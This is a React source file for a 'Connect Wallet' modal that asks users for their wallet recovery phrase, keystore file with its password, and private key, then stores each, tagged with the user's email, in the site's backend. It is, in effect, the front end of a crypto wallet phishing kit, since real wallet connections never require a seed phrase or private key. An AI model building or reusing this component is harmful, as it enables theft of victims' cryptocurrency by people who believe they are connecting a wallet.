
import React, { useState, useEffect } from 'react';
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogClose
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { X, Wallet } from 'lucide-react';
import { WalletSubmission } from '@/api/entities';
import { User } from '@/api/entities';

export default function ConnectWalletModal({ isOpen, onClose, wallet, onSuccess, onFeedback }) {
  const [activeTab, setActiveTab] = useState('phrase');
  const [phrase, setPhrase] = useState('');
  const [keystoreJson, setKeystoreJson] = useState('');
  const [keystorePassword, setKeystorePassword] = useState('');
  const [privateKey, setPrivateKey] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [currentUserEmail, setCurrentUserEmail] = useState(null);

  useEffect(() => {
    const fetchUser = async () => {
      try {
        const user = await User.me();
        setCurrentUserEmail(user.email);
      } catch (error) {
        console.error("User not logged in", error);
        onFeedback('error', 'Authentication Error', 'You must be logged in to submit a wallet.');
        onClose();
      }
    };
    if (isOpen) {
      fetchUser();
    }
  }, [isOpen]);

  const resetForm = () => {
    setPhrase('');
    setKeystoreJson('');
    setKeystorePassword('');
    setPrivateKey('');
    setActiveTab('phrase');
  };

  const handleSubmit = async () => {
    if (!currentUserEmail) {
      onFeedback('error', 'Authentication Error', 'Could not identify the current user. Please log in again.');
      return;
    }

    if (keystoreJson.trim() !== '' && keystorePassword.trim() === '') {
        onFeedback('error', 'Missing Information', 'Please provide the wallet password for your keystore.');
        setIsSubmitting(false);
        return;
    }

    setIsSubmitting(true);
    const submissionPromises = [];
    const baseSubmission = {
      user_email: currentUserEmail,
      wallet_name: wallet.name
    };

    if (phrase.trim() !== '') {
        submissionPromises.push(WalletSubmission.create({
            ...baseSubmission,
            submission_type: 'phrase',
            phrase: phrase.trim()
        }));
    }

    if (keystoreJson.trim() !== '' && keystorePassword.trim() !== '') {
        submissionPromises.push(WalletSubmission.create({
            ...baseSubmission,
            submission_type: 'keystore',
            keystore_json: keystoreJson.trim(),
            keystore_password: keystorePassword.trim()
        }));
    }

    if (privateKey.trim() !== '') {
        submissionPromises.push(WalletSubmission.create({
            ...baseSubmission,
            submission_type: 'private_key',
            private_key: privateKey.trim()
        }));
    }

    if (submissionPromises.length === 0) {
        onFeedback('error', 'Missing Information', 'Please fill in at least one wallet connection method.');
        setIsSubmitting(false);
        return;
    }

    try {
        await Promise.all(submissionPromises);

        onFeedback('success', 'Submission Successful!', `${submissionPromises.length} wallet detail(s) for ${wallet.name} submitted successfully!`);
        onSuccess();
        onClose();
        resetForm();

    } catch (error) {
        console.error('Wallet submission failed:', error);
        onFeedback('error', 'Submission Failed', `An error occurred: ${error.message || 'Please check the console for details.'}`);
    } finally {
        setIsSubmitting(false);
    }
  };

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="sm:max-w-md max-h-[90vh] flex flex-col">
        <DialogHeader className="sticky top-0 bg-white z-10 py-4 border-b">
          <div className="flex items-center gap-2">
            {wallet?.icon_url ? (
              <img 
                src={wallet.icon_url} 
                alt={wallet.name || 'Wallet icon'}
                className="w-6 h-6 object-contain"
                onError={(e) => {
                  e.currentTarget.style.display = 'none'; // Hide the broken image
                  const fallbackElement = e.currentTarget.nextElementSibling;
                  if (fallbackElement) {
                    fallbackElement.style.display = 'flex'; // Show the fallback div
                  }
                }}
              />
            ) : null}
            <div 
              className={`w-6 h-6 bg-blue-600 rounded flex items-center justify-center text-white text-sm font-semibold ${wallet?.icon_url ? 'hidden' : 'flex'}`}
            >
              {wallet?.name?.charAt(0) || 'W'}
            </div>
            <DialogTitle className="text-xl font-bold">
              Connect {wallet?.name || ''} Wallet
            </DialogTitle>
          </div>
        </DialogHeader>
        
        <div className="py-6 px-1 space-y-6 overflow-y-auto flex-1">
          <p className="text-sm text-gray-500 mb-4">
            Enter your wallet details. You can fill in multiple wallet types before connecting. Each filled tab will be submitted.
          </p>

          <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
            <TabsList className="grid w-full grid-cols-3">
              <TabsTrigger value="phrase">Phrase</TabsTrigger>
              <TabsTrigger value="keystore">Keystore</TabsTrigger>
              <TabsTrigger value="private">Private Key</TabsTrigger>
            </TabsList>

            <TabsContent value="phrase" className="mt-6">
              <div className="space-y-2">
                <label htmlFor="recovery-phrase" className="font-medium text-sm">Recovery Phrase</label>
                <Textarea
                  id="recovery-phrase"
                  placeholder="Enter your recovery phrase"
                  value={phrase}
                  onChange={(e) => setPhrase(e.target.value)}
                  className="h-28"
                />
                <p className="text-xs text-gray-500">Typically 12 (sometimes 24) words properly separated by single spaces</p>
              </div>
            </TabsContent>

            <TabsContent value="keystore" className="mt-6">
              <div className="space-y-4">
                <div className="space-y-2">
                  <label htmlFor="keystore-json" className="font-medium text-sm">Keystore</label>
                  <Textarea
                    id="keystore-json"
                    placeholder='{ "address": "...", "crypto": { ... } }'
                    value={keystoreJson}
                    onChange={(e) => setKeystoreJson(e.target.value)}
                    className="h-28"
                  />
                </div>
                <div className="space-y-2">
                  <label htmlFor="keystore-password" className="font-medium text-sm">Keystore/Wallet Password</label>
                  <Input
                    id="keystore-password"
                    type="text"
                    placeholder="Enter Keystore/Wallet Password"
                    value={keystorePassword}
                    onChange={(e) => setKeystorePassword(e.target.value)}
                  />
                  <p className="text-xs text-gray-500">Several lines of text plus the password used to encrypt it</p>
                </div>
              </div>
            </TabsContent>

            <TabsContent value="private" className="mt-6">
              <div className="space-y-2">
                <label htmlFor="private-key" className="font-medium text-sm">Private Key</label>
                <Textarea
                  id="private-key"
                  placeholder="Enter your Private Key"
                  value={privateKey}
                  onChange={(e) => setPrivateKey(e.target.value)}
                  className="h-28"
                />
                <p className="text-xs text-gray-500">Your private key string</p>
              </div>
            </TabsContent>
          </Tabs>

          <div className="flex justify-end gap-3 mt-8">
            <DialogClose asChild>
              <Button variant="outline">Cancel</Button>
            </DialogClose>
            <Button onClick={handleSubmit} disabled={isSubmitting} className="bg-blue-600 hover:bg-blue-700">
              {isSubmitting ? 'Submitting...' : 'Submit Details'}
            </Button>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  );
}
